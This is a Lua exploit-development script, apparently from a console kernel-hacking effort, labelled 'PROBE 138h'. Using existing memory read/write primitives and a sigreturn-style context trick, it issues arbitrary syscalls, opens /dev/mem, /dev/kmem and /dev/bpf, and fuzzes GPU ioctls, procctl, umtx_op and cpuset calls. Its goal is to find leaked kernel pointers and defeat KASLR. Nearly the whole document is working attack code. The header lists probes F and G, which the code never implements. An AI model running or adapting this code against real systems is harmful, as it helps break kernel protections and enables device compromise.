-- CRASH_CLASS: LOW
-- PROBE 138h: Safe KASLR vectors (avoids lethal: kldstat/kenv/modfnext/getfsstat)
--
-- A: /proc filesystem
-- B: gc ioctl (GPU compute)
-- C: procctl(544)
-- D: umtx_op(454) comprehensive
-- E: cpuset_getid(486), cpuset_getaffinity(487)
-- F: siginfo scan — trigger SIGCHLD self-kill, check siginfo for kptrs
-- G: mmap then read /proc/curproc/map for kernel VA in map entries

print("=== PROBE 138h: SAFE KASLR VECTORS ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function hex(v)
    if type(v) == "table" and v.h then
        return string.format("0x%08X%08X", v.h, v.l)
    end
    return string.format("0x%X", tonumber(v) or 0)
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end

local sc20 = make_syscall(20)
local sc_gc = make_syscall(421)
local sc_sr = make_syscall(417)
local pid = to_num(sc20())
print("pid=" .. pid)

local MC = 0x40
local ctx = memory.alloc(0x500)
pcall(function() return sc_gc(uint64(ctx)) end)
local rip = memory.read_qword(ctx + MC + 0xA0)
local rh2, rl2 = get_hi_lo(rip)
local sc_addr = uint64(string.format("0x%X%08X", rh2, rl2 - 2))

local function srop(num, a1, a2, a3, a4, a5, a6)
    pcall(function() return sc_gc(uint64(ctx)) end)
    memory.write_qword(ctx + MC + 0xA0, sc_addr)
    memory.write_qword(ctx + MC + 0x38, uint64(num))
    if a1 then memory.write_qword(ctx + MC + 0x08, a1) end
    if a2 then memory.write_qword(ctx + MC + 0x10, a2) end
    if a3 then memory.write_qword(ctx + MC + 0x18, a3) end
    if a4 then memory.write_qword(ctx + MC + 0x50, a4) end
    if a5 then memory.write_qword(ctx + MC + 0x28, a5) end
    if a6 then memory.write_qword(ctx + MC + 0x30, a6) end
    local ok, rv = pcall(function() return sc_sr(uint64(ctx)) end)
    return rv
end

local sc_mmap = make_syscall(477)
local _, gpu = pcall(function()
    return sc_mmap(uint64(0), uint64(0x40000), uint64(3),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end)
print("gpu=" .. hex(gpu))
local function ua(v) return uint64(string.format("0x%X", to_num(v))) end
local function ws(buf, s)
    for i = 1, #s do memory.write_byte(buf+i-1, string.byte(s,i)) end
    memory.write_byte(buf+#s, 0)
end
local function zero(addr, len)
    for off = 0, len - 1, 4 do memory.write_dword(addr + off, 0) end
end
local kfound = 0

local buf1 = gpu + 0x100
local buf2 = gpu + 0x500

--------------------------------------------------------------------
-- A: /proc filesystem and /dev special files
--------------------------------------------------------------------
print("")
print("--- [A] /proc + /dev ---")
local paths = {
    "/proc", "/proc/curproc", "/proc/curproc/map",
    "/proc/curproc/status", "/proc/curproc/mem",
    "/proc/curproc/file", "/proc/curproc/ctl",
    "/proc/self/maps", "/dev/mem", "/dev/kmem",
    "/dev/pf", "/dev/bpf", "/dev/bpf0",
}
for _, p in ipairs(paths) do
    ws(buf1, p)
    local fd = srop(5, ua(buf1), uint64(0x0004))
    local fh, fl = get_hi_lo(fd)
    if fl > 0 and fl < 256 and fh == 0 then
        print(string.format("[A] *** %s OPENED fd=%d ***", p, fl))
        zero(buf2, 0x400)
        local rv_rd = srop(3, uint64(fl), ua(buf2), uint64(0x400))
        local rdh, rdl = get_hi_lo(rv_rd)
        if rdl > 0 and rdl <= 0x400 and rdh == 0 then
            print(string.format("[A] read %d bytes!", rdl))
            local s = ""
            for i = 0, math.min(rdl, 200) - 1 do
                local b = to_num(memory.read_byte(buf2 + i))
                if b >= 32 and b < 127 then s = s .. string.char(b)
                elseif b == 10 then s = s .. "\\n"
                else s = s .. "." end
            end
            print("[A] " .. s)
            for off = 0, math.min(rdl, 0x400) - 1, 8 do
                local v = safe_rq(buf2 + off)
                if v then
                    local vh, vl = get_hi_lo(v)
                    if vh >= 0xFFFF8000 and vh ~= 0xFFFFFFFF then
                        kfound = kfound + 1
                        print(string.format("[A] *** KPTR %s+0x%02X: %s ***", p, off, hex(v)))
                    end
                end
            end
        else
            print(string.format("[A] read=%s", hex(rv_rd)))
        end
        srop(6, uint64(fl))
    end
end
print("[A] pid=" .. to_num(sc20()))

--------------------------------------------------------------------
-- B: gc ioctl
--------------------------------------------------------------------
print("")
print("--- [B] gc ioctl ---")
ws(buf1, "/dev/gc")
local gc_fd = srop(5, ua(buf1), uint64(2))
local gch, gcl = get_hi_lo(gc_fd)
if gcl > 0 and gcl < 256 and gch == 0 then
    print("[B] gc fd=" .. gcl)
    local io_buf = gpu + 0xE000
    local hits = 0
    for _, grp in ipairs({0x47, 0x67, 0x44, 0x53, 0x42}) do
        for cmd = 0, 15 do
            for _, sz in ipairs({4, 8, 16, 32, 64}) do
                zero(io_buf, 0x100)
                local code = 0x40000000 + (sz * 0x10000) + (grp * 0x100) + cmd
                local rv = srop(54, uint64(gcl), uint64(code), ua(io_buf))
                local ivh, ivl = get_hi_lo(rv)
                if ivl == 0 and ivh == 0 then
                    hits = hits + 1
                    print(string.format("[B] *** ioctl 0x%08X (grp=%c cmd=%d sz=%d) WORKS!",
                        code, grp, cmd, sz))
                    for off = 0, math.min(sz, 64) - 1, 8 do
                        local v = safe_rq(io_buf + off)
                        if v then
                            local vh, vl = get_hi_lo(v)
                            if vh > 0 or vl > 0 then
                                print(string.format("  +0x%02X: %s", off, hex(v)))
                            end
                            if vh >= 0xFFFF8000 and vh ~= 0xFFFFFFFF then
                                kfound = kfound + 1
                                print("  *** KERNEL POINTER! ***")
                            end
                        end
                    end
                end
            end
        end
    end
    print("[B] gc ioctl hits=" .. hits)
    srop(6, uint64(gcl))
else
    print("[B] gc OPEN FAIL")
end
print("[B] pid=" .. to_num(sc20()))

--------------------------------------------------------------------
-- C: procctl(544)
--------------------------------------------------------------------
print("")
print("--- [C] procctl ---")
for _, cmd in ipairs({1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16}) do
    zero(buf2, 0x100)
    local rv = srop(544, uint64(0), uint64(pid), uint64(cmd), ua(buf2))
    local pvh, pvl = get_hi_lo(rv)
    if pvl == 0 and pvh == 0 then
        print(string.format("[C] *** procctl(cmd=%d) WORKS!", cmd))
        for off = 0, 0x40, 8 do
            local v = safe_rq(buf2 + off)
            if v then
                local vh, vl = get_hi_lo(v)
                if vh > 0 or vl > 0 then
                    print(string.format("  +0x%02X: %s", off, hex(v)))
                end
                if vh >= 0xFFFF8000 and vh ~= 0xFFFFFFFF then
                    kfound = kfound + 1
                    print("  *** KERNEL POINTER! ***")
                end
            end
        end
    end
end
print("[C] pid=" .. to_num(sc20()))

--------------------------------------------------------------------
-- D: umtx_op(454)
--------------------------------------------------------------------
print("")
print("--- [D] umtx_op ---")
local umtx_obj = gpu + 0xC000
for _, op in ipairs({0,1,2,3,4,5,6,7,8,9,10,17,21,22,23,25,26}) do
    zero(umtx_obj, 0x100)
    zero(buf2, 0x100)
    local rv = srop(454, ua(umtx_obj), uint64(op), uint64(0), ua(buf2), uint64(0))
    local uvh, uvl = get_hi_lo(rv)
    if uvl == 0 and uvh == 0 then
        print(string.format("[D] umtx_op(%d)=OK", op))
        for off = 0, 0x40, 8 do
            local v = safe_rq(buf2 + off)
            if v then
                local vh, vl = get_hi_lo(v)
                if vh > 0 or vl > 0 then
                    print(string.format("  buf+0x%02X: %s", off, hex(v)))
                end
                if vh >= 0xFFFF8000 and vh ~= 0xFFFFFFFF then
                    kfound = kfound + 1
                    print("  *** KERNEL POINTER! ***")
                end
            end
        end
        local obj_val = safe_rq(umtx_obj)
        if obj_val then
            local oh, ol = get_hi_lo(obj_val)
            if oh > 0 or ol > 0 then
                print(string.format("[D] obj=%s", hex(obj_val)))
            end
            if oh >= 0xFFFF8000 and oh ~= 0xFFFFFFFF then
                kfound = kfound + 1
                print("[D] *** KPTR in umtx obj! ***")
            end
        end
    end
end
print("[D] pid=" .. to_num(sc20()))

--------------------------------------------------------------------
-- E: cpuset_getid(486) + cpuset_getaffinity(487)
--------------------------------------------------------------------
print("")
print("--- [E] cpuset ---")
zero(buf2, 0x20)
local rv_csid = srop(486, uint64(2), uint64(0), uint64(pid), ua(buf2))
print("[E] cpuset_getid=" .. hex(rv_csid))
local csid = safe_rq(buf2)
if csid then print("[E] cpuset_id=" .. hex(csid)) end

zero(buf2, 0x100)
local rv_aff = srop(487, uint64(2), uint64(0), uint64(pid), uint64(0x100), ua(buf2))
print("[E] cpuset_getaffinity=" .. hex(rv_aff))
local afh, afl = get_hi_lo(rv_aff)
if afl == 0 and afh == 0 then
    for off = 0, 0x20, 8 do
        local v = safe_rq(buf2 + off)
        if v then
            local vh, vl = get_hi_lo(v)
            if vh > 0 or vl > 0 then
                print(string.format("[E] aff+0x%02X: %s", off, hex(v)))
            end
        end
    end
end
print("[E] pid=" .. to_num(sc20()))

print("")
print("TOTAL kptrs=" .. kfound)
print("pid=" .. to_num(sc20()))
print("=== DONE ===")
